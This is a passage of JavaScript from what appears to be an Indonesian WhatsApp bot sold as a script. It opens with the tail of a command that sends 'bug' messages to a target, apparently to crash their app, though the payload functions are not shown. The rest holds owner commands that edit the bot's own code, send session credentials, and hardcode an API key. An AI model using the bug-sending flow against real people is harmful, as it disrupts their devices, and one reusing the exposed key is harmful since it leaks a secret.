await ngeloc(Pe, force)
await pirgam(Pe, ryobug)
await ngeloc(Pe, force)
await penghitaman(Pe, force2)
await ngeloc(Pe, force)
}
await rafatharcodereply(`_Sukses Bug Sudah Terkirim Ke Target😈_`)
await rafatharcodereply(`_silahlan di cek, target sudah_ *c1*`)
}
break

// === Owner Menu

case 'addcase': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} case nya`);
const namaFile = path.join(__dirname, 'rafatharcode.js');
const caseBaru = `${text}\n\n`;
const tambahCase = (data, caseBaru) => {
const posisiDefault = data.lastIndexOf("default:");
if (posisiDefault !== -1) {
const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahCase(data, caseBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan case baru:');
console.log(caseBaru);
return m.reply('Sukses menambahkan case!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break

case 'delcase': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} nama case`);
const fs = require('fs').promises;
async function dellCase(filePath, caseNameToRemove) {
try {
let data = await fs.readFile(filePath, 'utf8');
const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
const modifiedData = data.replace(regex, '');
if (data === modifiedData) {
m.reply('Case tidak ditemukan atau sudah dihapus.');
return;
}
await fs.writeFile(filePath, modifiedData, 'utf8');
m.reply('Sukses menghapus case!');
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}}
dellCase('./rafatharcode.js', q);
break;
}

case 'getcase': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} 1 caseName atau ${prefix+command} 2 caseName1 caseName2`);
const modeRegex = /^([12])\s+(.+)$/;
const match = text.match(modeRegex);
if (!match) return m.reply(`Format tidak valid. Contoh: ${prefix+command} 1 caseName atau ${prefix+command} 2 caseName1 caseName2`);
const mode = parseInt(match[1], 10);
const caseNames = match[2].split(' ').map(name => name.trim()).filter(name => name);
if (mode === 1 && caseNames.length !== 1) {
return m.reply(`Untuk mode '1', masukkan satu case name. Contoh: ${prefix+command} 1 caseName`);
}
if (mode === 2 && (caseNames.length < 1 || caseNames.length > 2)) {
return m.reply(`Untuk mode '2', masukkan satu atau dua case names. Contoh: ${prefix+command} 2 caseName1 caseName2`);
}
const getCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./rafatharcode.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return m.reply(`Case '${caseName}' tidak ditemukan.`);
}
return match[0];
} catch (error) {
return m.reply(`Terjadi kesalahan saat membaca file: ${error.message}`);
}};
const getCases = async (caseNames) => {
try {
const casePromises = caseNames.map(caseName => getCase(caseName));
const cases = await Promise.all(casePromises);
return cases.join('\n\n');
} catch (error) {
return m.reply(`Terjadi kesalahan: ${error.message}`);
}};

getCases(caseNames)
.then(caseCode => m.reply(caseCode))
.catch(error => m.reply(`Terjadi kesalahan: ${error.message}`));
break;
}

case 'cekcase': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} caseName`);
const caseName = text.trim();
if (!caseName) return m.reply(`Masukkan nama case yang ingin dicek. Contoh: ${prefix+command} caseName`);
const cekCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./rafatharcode.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return { found: false };
}
const lines = fileContent.split('\n');
const caseLines = match[0].split('\n');
const startLine = lines.indexOf(caseLines[0]) + 1;
const endLine = startLine + caseLines.length - 1;
return {
found: true,
startLine,
endLine,
content: match[0]
};
} catch (error) {
return { error: `Terjadi kesalahan saat membaca file: ${error.message}` };
}};
const result = await cekCase(caseName);
if (result.error) {
m.reply(result.error);
} else if (result.found) {
const message = `
*CASE DITEMUKAN!*
• Nama Case: ${caseName}
• Baris Awal: ${result.startLine}
• Baris Akhir: ${result.endLine}

Mau sekalian di ambil?`;
let kon = `{\"display_text\":\"YA\",\"id\":\"${prefix}getcase 1 ${text}\"}`
quickreply1(m.chat, message, kon, m)
userSessions[m.sender] = { caseToRetrieve: result, caseName };
} else {
m.reply(`Case '${caseName}' tidak ditemukan.`);
}
break;
}

case 'listcase': {
if (!isOwner) return onlyOwn()
let { listCase } = require('./lib/general/listcase.js')
m.reply(listCase())
}
break

case 'vurl': {
    if (!text) return m.reply('link nya ?')
if (!isOwner) return rafatharcodereply('Fitur Ini Khusus Owner')
    const longUrl = encodeURIComponent(text);

    axios.get(`https://vurl.com/api.php?url=${longUrl}`)
    .then(response => {
        const shortUrl = response.data.trim();
        m.reply(`${shortUrl}`);
    })
    .catch(error => {
        console.error(error);
        m.reply('Terjadi kesalahan saat memendekkan URL.');
    });
}
break

case 'info-cuaca':{
if (!isOwner) return rafatharcodereply('Khusus Owner!')
if (!text) return rafatharcodereply ('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

          rafatharcode.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break

case 'addfunc':
case 'addfunction': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} function barunya`);
const namaFile = path.join(__dirname, 'rafatharcode.js');
const functionBaru = `${text}\n\n`;
const tambahFunction = (data, functionBaru) => {
const posisiButtonUrl = data.indexOf("function buttonurl");
if (posisiButtonUrl !== -1) {
const kodeBaruLengkap = data.slice(0, posisiButtonUrl) + functionBaru + data.slice(posisiButtonUrl);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan function buttonurl di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahFunction(data, functionBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan function baru:');
console.log(functionBaru);
return m.reply('Sukses menambahkan function!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break;

case 'delfunc':
case 'delfunction': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} functionName`);
const isValidFunctionName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const deleteFunction = (functionName) => {
if (!isValidFunctionName(functionName)) return m.reply(`Nama fungsi tidak valid: ${functionName}`);
try {
const fileContent = fs.readFileSync("./rafatharcode.js", "utf8");
const functionRegex = new RegExp(`function\\s+${functionName}\\s*\\([^)]*\\)\\s*{`, "g");
const match = functionRegex.exec(fileContent);
if (!match) return m.reply(`Fungsi ${functionName} tidak ditemukan`);
const functionStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;
let functionEnd;

for (let i = functionStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') inString = !inString;
if (!inString) {
if (currentChar === '{') braceCount++;
if (currentChar === '}') braceCount--;
}}
if (braceCount === 0 && currentChar === '}') {
functionEnd = i + 1;
break;
}
prevChar = currentChar;
}
if (functionEnd === undefined) return m.reply(`Fungsi ${functionName} tidak lengkap atau kurung kurawal tidak seimbang`);
const updatedContent = fileContent.slice(0, functionStart) + fileContent.slice(functionEnd);
fs.writeFileSync("./rafatharcode.js", updatedContent, "utf8");
return m.reply(`Fungsi ${functionName} telah dihapus`);
} catch (err) {
return m.reply(`Terjadi kesalahan: ${err.message}`);
}};
m.reply(deleteFunction(q));
}
break

case 'rget':
if (!isOwner) return onlyOwn()
if (!/^https?:\/\//.test(text)) return reply(`'Awali *URL* dengan http:// atau https://`)
const ajg = await fetch(text);
if (ajg.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
throw `Content-Length: ${ajg.headers.get('content-length')}`;
}
const contentType = ajg.headers.get('content-type');
if (contentType.startsWith('image/')) {
return rafatharcode.sendMessage(m.chat, { image: { url: text } }, 'imageMessage', text, m);
}
if (contentType.startsWith('video/')) {
return rafatharcode.sendMessage(m.chat, { video: { url: text } }, 'videoMessage', text, m);
}
if (contentType.startsWith('audio/')) {
return rafatharcode.sendMessage(m.chat, { audio: { url: text } }, 'audioMessage', text, m);
}
let alak = await ajg.buffer();
try {
alak = util.format(JSON.parse(alak + ''));
} catch (e) {
alak = alak + '';
} finally {
reply(alak.slice(0, 65536));
}
break

case 'getfunc':
case 'getfunction': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} functionName`);
const isValidFunctionName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const getFunction = (functionName) => {
if (!isValidFunctionName(functionName)) return m.reply(`Nama fungsi tidak valid: ${functionName}`);
try {
const fileContent = fs.readFileSync("./rafatharcode.js", "utf8");

const functionRegex = new RegExp(`function\\s+${functionName}\\s*\\([^)]*\\)\\s*{`, "g");
const match = functionRegex.exec(fileContent);
if (!match) return m.reply(`Fungsi ${functionName} tidak ditemukan`);

const functionStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;
for (let i = functionStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') inString = !inString;
if (!inString) {
if (currentChar === '{') braceCount++;
if (currentChar === '}') braceCount--;
}}
if (braceCount === 0 && currentChar === '}') {
const functionEnd = i + 1;
const functionContent = fileContent.slice(functionStart, functionEnd);
return functionContent;
}
prevChar = currentChar;
}} catch (err) {
return m.reply(`Terjadi kesalahan: ${err.message}`);
}}  
m.reply(`${getFunction(q)}`);
}
break

case 'cekfunc':
case 'cekfunction': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} functionName`);
const functionName = text.trim();
if (!functionName) return m.reply(`Masukkan nama function yang ingin dicek. Contoh: ${prefix+command} functionName`);
const cekFunction = async (functionName) => {
try {
const fileContent = await fs.promises.readFile("./rafatharcode.js", "utf-8");
const functionRegex = new RegExp(`function ${functionName}\\s*\\([\\s\\S]*?\\)\\s*\\{[\\s\\S]*?\\}`, 'g');
const match = fileContent.match(functionRegex);
if (!match) {
return { found: false };
}
const lines = fileContent.split('\n');
const functionLines = match[0].split('\n');
const startLine = lines.indexOf(functionLines[0]) + 1;
const endLine = startLine + functionLines.length - 1;
return {
found: true,
startLine,
endLine,
content: match[0]
};
} catch (error) {
return { error: `Terjadi kesalahan saat membaca file: ${error.message}` };
}};
const result = await cekFunction(functionName);
if (result.error) {
m.reply(result.error);
} else if (result.found) {
const message = `
*FUNCTION DITEMUKAN!*
• Nama funct: ${functionName}
• Baris awal: ${result.startLine}
• Baris akhir: ${result.endLine}

Mau sekalian di ambil?`;
let kun = `{\"display_text\":\"YA\",\"id\":\"${prefix}getfunc ${text}\"}`
quickreply1(m.chat, message, kun, m)
userSessions[m.sender] = { functionToRetrieve: result, functionName };
} else {
m.reply(`Function '${functionName}' tidak ditemukan.`);
}
break;
}

case 'addlet': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} let barunya`);
const namaFile = path.join(__dirname, 'rafatharcode.js');
const letBaru = `${text}\n\n`;
const tambahLet = (data, letBaru) => {
const posisiContacts = data.indexOf("const contacts");
if (posisiContacts !== -1) {
const kodeBaruLengkap = data.slice(0, posisiContacts) + letBaru + data.slice(posisiContacts);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan const contacts di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahLet(data, letBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan let baru:');
console.log(letBaru);
return m.reply('Sukses menambahkan let!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break;

case 'del': case 'delete': {
if (!m.isGroup) {
if (!isOwner) return onlyOwn();
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
rafatharcode.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isBotAdmin) return onlyBotAdmin();
rafatharcode.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isOwner) return onlyOwn();
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
rafatharcode.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break

case 'dellet': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} letVariableName`);
const isValidVariableName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const deleteLet = (variableName) => {
if (!isValidVariableName(variableName)) return m.reply(`Nama variabel tidak valid: ${variableName}`);
try {
const fileContent = fs.readFileSync("./rafatharcode.js", "utf8");
const letRegex = new RegExp(`\\blet\\s+${variableName}\\s*=\\s*([^;]+);`, "g");
const match = letRegex.exec(fileContent);
if (!match) return m.reply(`Variabel ${variableName} tidak ditemukan`);

const variableStart = match.index;
const variableEnd = variableStart + match[0].length;
const updatedContent = fileContent.slice(0, variableStart) + fileContent.slice(variableEnd);
fs.writeFileSync("./rafatharcode.js", updatedContent, "utf8");
return m.reply(`Variabel ${variableName} telah dihapus`);
} catch (err) {
return m.reply(`Terjadi kesalahan: ${err.message}`);
}};
m.reply(deleteLet(q));
}
break

case 'getlet': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} letName`);
const isValidVariableName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const getLet = (letName) => {
if (!isValidVariableName(letName)) return m.reply(`Nama variabel tidak valid: ${letName}`);
try {
const fileContent = fs.readFileSync("./rafatharcode.js", "utf8");
const letRegex = new RegExp(`let\\s+${letName}\\s*=`, "g");
const match = letRegex.exec(fileContent);

if (!match) return m.reply(`Variabel ${letName} tidak ditemukan`);
const letStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;

for (let i = letStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') {
if (inString && currentChar === inString) {
inString = false;
} else if (!inString) {
inString = currentChar;
}}
if (!inString && !inComment) {
if (currentChar === '{') braceCount++;
if (currentChar === '}') braceCount--;
if (currentChar === ';' && braceCount === 0) {
const letEnd = i + 1;
const letContent = fileContent.slice(letStart, letEnd);
return letContent;
}}}
prevChar = currentChar;
}} catch (err) {
return m.reply(`Terjadi kesalahan: ${err.message}`);
}}
m.reply(`${getLet(q)}`);
}
break

case 'addconst': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} const barunya`);
const namaFile = path.join(__dirname, 'rafatharcode.js');
const constBaru = `${text}\n\n`;
const tambahConst = (data, constBaru) => {
const posisiIsAntiLink = data.indexOf("const isAntiLink");
if (posisiIsAntiLink !== -1) {
const kodeBaruLengkap = data.slice(0, posisiIsAntiLink) + constBaru + data.slice(posisiIsAntiLink);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan const isAntiLink di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahConst(data, constBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan const baru:');
console.log(constBaru);
return m.reply('Sukses menambahkan const!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break;

case 'getdep': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} 1 depName atau ${prefix+command} 2 depName1 depName2`);
const modeRegex = /^([12])\s+(.+)$/;
const match = text.match(modeRegex);
if (!match) return m.reply(`Format tidak valid. Contoh: ${prefix+command} 1 depName atau ${prefix+command} 2 depName1 depName2`);
const mode = parseInt(match[1], 10);
const depNames = match[2].split(' ').map(name => name.trim()).filter(name => name);
if (mode === 1 && depNames.length !== 1) {
return m.reply(`Untuk mode '1', masukkan satu dep name. Contoh: ${prefix+command} 1 depName`);
}
if (mode === 2 && (depNames.length < 1 || depNames.length > 2)) {
return m.reply(`Untuk mode '2', masukkan satu atau dua dep names. Contoh: ${prefix+command} 2 depName1 depName2`);
}
const getDependency = async (depName) => {
try {
const packageContent = await fs.promises.readFile("./package.json", "utf-8");
const packageJson = JSON.parse(packageContent);
const dependencyVersion = packageJson.dependencies[depName] || packageJson.devDependencies[depName];
if (!dependencyVersion) {
return m.reply(`Dependency '${depName}' tidak ditemukan.`);
}
return `"${depName}": "${dependencyVersion}"`;
} catch (error) {
return m.reply(`Terjadi kesalahan saat membaca file: ${error.message}`);
}};
const getDependencies = async (depNames) => {
try {
const depPromises = depNames.map(depName => getDependency(depName));
const dependencies = await Promise.all(depPromises);
return dependencies.join('\n\n');
} catch (error) {
return m.reply(`Terjadi kesalahan: ${error.message}`);
}};
getDependencies(depNames)
.then(dependencyCode => m.reply(dependencyCode))
.catch(error => m.reply(`Terjadi kesalahan: ${error.message}`));
break;
}

case 'gantifile': {
if (!isOwner) return onlyOwn();
if (!text.includes("./")) return m.reply(`Contoh: ${prefix+command} ./package.json`); 
let dir = path.dirname(text);
let fileName = path.basename(text);
if (!fs.existsSync(dir)) {
return m.reply('Direktori tidak ditemukan!');
}

let files = fs.readdirSync(dir);
if (!files.includes(fileName)) {
return m.reply('Tidak dapat menemukan file!');
}
let media = await downloadContentFromMessage(m.quoted, "document");
let buffer = Buffer.from([]);
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk]);
}

fs.writeFileSync(text, buffer);
m.reply(`Mengupload file...`);
await sleep(2000);
m.reply(`Berhasil mengupload ${fileName}`);
}
break

case 'sendfitur': {
if (!isOwner) return onlyOwn();
if (!m.quoted) return m.reply('Kutip pesan seseorang!');
if (!text) return m.reply(`Contoh: ${prefix+command} menu`);
const getCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./rafatharcode.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return m.reply(`Case '${caseName}' tidak ditemukan.`);
}
return match[0];
} catch (error) {
return m.reply(`Terjadi kesalahan saat membaca file: ${error.message}`);
}};
const caseName = text.trim();
getCase(caseName)
.then(caseCode => {
const recipient = m.quoted ? m.quoted.sender : m.mentionedJid[0];
if (!recipient || !recipient.includes('@s.whatsapp.net')) {
return m.reply('Format ID WhatsApp tidak valid!');
}
const sendFeature = async (recipient, caseCode) => {
try {
const contact = (await rafatharcode.onWhatsApp(recipient.split('@')[0]))[0] || {};
if (!contact) return m.reply('Kontak tidak ditemukan di WhatsApp.');
const message = `Hi, kamu dapet kiriman fitur nih!\n\n${caseCode}`;
await rafatharcode.sendMessage(recipient, { text: message }, { quoted: m });
m.reply('Fitur berhasil terkirim!');
} catch (error) {
console.error('Terjadi kesalahan:', error.message);
m.reply('Terjadi kesalahan saat mengirim fitur: ' + error.message);
}};
sendFeature(recipient, caseCode);
})
.catch(error => m.reply(`Terjadi kesalahan: ${error.message}`));
break;
}

case 'backup': {
if (!isOwner) return onlyOwn() 
let jir = m.mentionedJid[0] || m.sender || rafatharcode.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
await m.reply('Mengumpulkan semua file ke folder...');
const { execSync } = require("child_process");
 const ls = (await execSync("ls")).toString().split("\n").filter( (pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "" );
await m.reply('Script akan dikirim lewat PC!')
const exec = await execSync(`zip -r Backup.zip ${ls.join(" ")}`);
await rafatharcode.sendMessage(jir, {
document: await fs.readFileSync("./Backup.zip"),
mimetype: "application/zip",
fileName: "Backup.zip",
},
{quoted: m });
await execSync("rm -rf Backup.zip");
}
break

case 'getsession': {
if (!isOwner) return onlyOwn()
rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
let sesi = await fs.readFileSync(`./${sessionName}/creds.json`)
await rafatharcode.sendMessage(m.chat, {
document: sesi,
mimetype: 'application/json',
fileName: 'creds.json'
}, {quoted: m})
}
break

case 'delsession': {
if (!isOwner) return onlyOwn()
fs.readdir(`./${sessionName}`, async function(err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return m.reply('Unable to scan directory: ' + err);}
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state"))
console.log(filteredArray.length);
let teks = `Detected ${filteredArray.length} junk files\n\n`
if (filteredArray.length == 0) return m.reply(teks)
filteredArray.map(function(err, i) {
teks += (i + 1) + `. ${e}\n` })
m.reply(teks)
await sleep(2000)
m.reply("Menghapus session...")
await filteredArray.forEach(function(file) {
fs.unlinkSync(`./${sessionName}/${file}`)
});
await sleep(2000)
m.reply('Sukses menghapus session!')
});
}
break

case 'ambilsc': {
if (!isOwner) return onlyOwn()
if (!isPc) return onlyPrivat()
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
let a = getTime().split("T")[1].split("+")[0]
var name = `RafaV3` // Gak bisa pake spasi !
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await rafatharcode.sendMessage(owner+'@s.whatsapp.net', {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, 
mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
}
break

case 'sendsc': {
if (!isOwner) return onlyOwn()
if (!m.quoted) return m.reply('Kutip pesan seseorang!')
edit2("Memproses pengiriman...", "Script berhasil terkirim!")
let a = getTime().split("T")[1].split("+")[0]
let t = q.split(' ');
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
var name = `RafaV3` // Gak bisa pakai spasi !
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await rafatharcode.sendMessage(u, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, 
mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
}
break

case 'chat': {
if (!isOwner) return onlyOwn()
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} text,nomer`)
let chat = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
rafatharcode.sendMessage(u, { text: chat }, { quoted: m })
}
break

case 'sendbyr': case 'sendutang': case 'byrutang': {
	if (!isOwner) return onlyOwn()
	if (!q) return rafatharcodereply('*Contoh:*\n.sendbyr 628xxx')
	var number = q.replace(/[^0-9]/gi, '')+'@s.whatsapp.net'
let tekssss = `───「  *PAYMENT RAFATHARCODE*  」────

- *Dana :* *${global.dana}*
- *Gopay :* *${global.gopay}*
- *Ovo :* *${global.ovo}*
- *Qris :* *SCAN QRIS DIATAS🙏*

_Pembayaran ini Telah di kirim oleh Admin_
_Melalui bot ini🙏_


OK, thanks udah order di *${ownername}*
`
rafatharcode.sendMessage(number, { image: fs.readFileSync(`./r/qr.jpg`),
 caption: tekssss, 
footer: `${ownername} © 2024`},
{quoted: m})
rafatharcodereply(`Suksess Owner ku tercinta 😘🙏`)
}
break

case 'done2': {
if (!isOwner) return onlyOwn()
let t = text.split(',');
if (t.length < 4) return rafatharcodereply(`*Format salah!*
Penggunaan:
${prefix + command} trx,barang,harga,tanggal`);
let trx = t[0];
let barang = t[1];
let price = t[2];
let date = t[3];
var teks = `
*#${trx}*
𝗔𝗟𝗛𝗔𝗠𝗗𝗨𝗟𝗜𝗟𝗟𝗔𝗛 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗗𝗢𝗡𝗘 ✅
━━━━━━━━━━━━━━━━━━━━
📦 BARANG   : ${barang}
🔖 PRICE       : ${price}
📅 DATE          : ${date}
*TERIMAKASIH SUDAH MEMBELI DI ${ownername}🥵*

*_ALL TRX ON_*

➥ _SC INSTALL PANEL_
➥ _SC BUG GANAS V1_
➥ _SC QIO V13 ORI NO ENC_
➥ _SC RAFATHARCODE NO ENC V1.0.0_
➥ _SC RAFATHARCODE NO ENC V2.0.0_
➥ _SC RAFATHARCODE NO ENC V3.0.0_
➥ _SC RAFATHARCODE NO ENC V3.0.3 UPDATE_
➥ _SC RAFATHARCODE NO ENC V3.0.3 GATEWAY SAWERIA_
➥ _SC RAFATHARCODE V3.0.3 PRIBADI NEW_
➥ _SC RAFATHARCODE V3.0.3 NEW_
➥ _SC CPANEL VIA TELEGRAM_
➥ _SC SUBDOMAIN ADA 19_
➥ _API SUBDOMAIN ADA 19_
➥ _RESELLER SUBDOMAIN_
➥ _RESELLER PANEL FRESH_
➥ _OWNER PANEL_
➥ _ADMIN PANEL FRESH_
➥ _PANEL 1-5 GB/UNLI_
➥ _JASA INSTALL PANEL_
➥ _JASA INSTAL THEMA_
➥ _VPS DIGITAL OCEAN_
➥ _FATNER UNBAN/BAN/PANEL_
➥ _TOKEN INSTALLPANEL||STARTWINGS||INSTALLTHEMA_
➥ _JASA PEMBUATAN BASH/TOKEN INSTALLPANEL PRIBADI_

MINAT ? PM wa.me/6285864743922`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testi Owner\",\"url\":\"https://whatsapp.com/channel/0029Vajny6c4tRs0qnwveJ0s\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajny6c4tRs0qnwveJ0s\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'buyscmenu':
case 'buyscmenu': {
let teksnya = `Berikut List Script Menu`
let sections = [{
title: '# LIST SCRIPT MENU',
